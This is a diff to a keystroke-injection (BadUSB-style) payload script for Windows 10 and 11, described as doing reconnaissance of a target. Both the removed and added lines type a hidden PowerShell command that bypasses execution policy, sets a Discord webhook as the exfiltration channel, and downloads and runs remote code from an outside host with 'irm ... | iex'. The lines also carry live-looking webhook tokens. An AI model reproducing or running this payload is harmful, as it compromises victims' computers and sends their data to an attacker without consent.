@@ -7,6 +7,15 @@ REM     Description: This payload is meant to do an advanced recon of the target
 REM     Target: Windows 10, 11
 
 GUI r
-DELAY 500
-ALTSTRING powershell -w h -NoP -Ep Bypass $dc='https://discordapp.com/api/webhooks/1072089204504412192/eOgG2qvFTLB9KTtMsW0SvZu23f60Xxo11lErJIkNKIrs-QgAkZ4NkIRLw1zaNBUeCjbV';$db='';irm jakoby.lol/9nb | iex
+DELAY 2000
+STRING powershell 
+ENTER
+DELAY 1500
+ALTSTRING $dc='https://discordapp.com/api/webhooks/1072445434154451024/4Y14Y_SszDnLnEqDQwX2pS3Sda5Zo5ZcOdvGQkRCO-Y7aPchfOQ-m605FxgkNqeEk7n7'
+ENTER
+DELAY 600
+ALTSTRING $db=''
+ENTER
+DELAY 600
+ALTSTRING powershell -w h -NoP -Ep Bypass $dc='https://discordapp.com/api/webhooks/1072445434154451024/4Y14Y_SszDnLnEqDQwX2pS3Sda5Zo5ZcOdvGQkRCO-Y7aPchfOQ-m605FxgkNqeEk7n7';$db='';irm jakoby.lol/9nb | iex
 ENTER
